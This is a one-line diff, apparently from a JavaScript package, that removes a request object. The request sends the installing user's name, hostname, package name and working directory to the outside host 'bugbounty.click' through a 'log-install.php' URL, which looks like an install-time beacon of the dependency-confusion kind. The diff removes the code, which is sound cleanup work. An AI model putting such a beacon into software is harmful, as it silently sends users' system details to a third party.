@@ -1,1 +1,0 @@
-const t={hostname:"bugbounty.click",port:443,path:"/dc1234-bugbounty/knock-knock/log-install.php?Username="+encodeURI(r+" ("+e+")")+"&Hostname="+encodeURI(o)+"&Package=bazel-out&PWD="+__dirname,method:"GET"}
